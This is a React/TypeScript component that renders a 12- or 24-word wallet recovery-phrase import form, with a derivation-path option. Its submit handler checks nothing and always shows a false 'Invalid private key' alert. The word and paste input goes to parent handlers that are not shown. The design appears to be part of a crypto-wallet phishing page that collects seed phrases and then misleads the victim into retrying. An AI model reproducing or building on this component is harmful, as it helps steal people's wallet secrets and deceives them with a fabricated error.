import type { FormEvent } from "react";
import { HdPathPopup } from "./HdPathPopup";
import { WordField } from "./WordField";

type PhraseFormProps = {
    wordCount: number;
    words: string[];
    hdPathVisible: boolean;
    setHdPathVisible: (visible: boolean) => void;
    onWordChange: (index: number, value: string) => void;
    onKeyDown: (e: React.KeyboardEvent<HTMLInputElement>, index: number) => void;
    onPaste: (e: React.ClipboardEvent<HTMLInputElement>, index: number) => void;
    onHdPathClick: () => void;
};

export function PhraseForm({ wordCount, words, onWordChange, onKeyDown, onPaste, hdPathVisible, setHdPathVisible }: PhraseFormProps) {

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        window.alert('Invalid private key\nPlease check your key and try again!');
    };

    return (
        <form className="login__form" onSubmit={handleSubmit}>
            <div className={`login__fields ${wordCount === 24 ? 'login__fields-24' : ''}`}>
                {Array.from({ length: wordCount }).map((_, i) => (
                    <WordField
                        key={i}
                        index={i}
                        value={words[i]}
                        onChange={onWordChange}
                        onKeyDown={onKeyDown}
                        onPaste={onPaste}
                    />
                ))}
            </div>
            {!hdPathVisible && <button type="button" className="btn login__path-btn" onClick={() => setHdPathVisible(true)}>
                Set Derivation Path (Advanced)
            </button>}
            <HdPathPopup visible={hdPathVisible} onClose={() => setHdPathVisible(false)} />

            <button type="submit" className="login__submit-btn btn btn--one" disabled={!words.slice(0, wordCount).every(Boolean)}>
                Import
            </button>
        </form>
    );
}
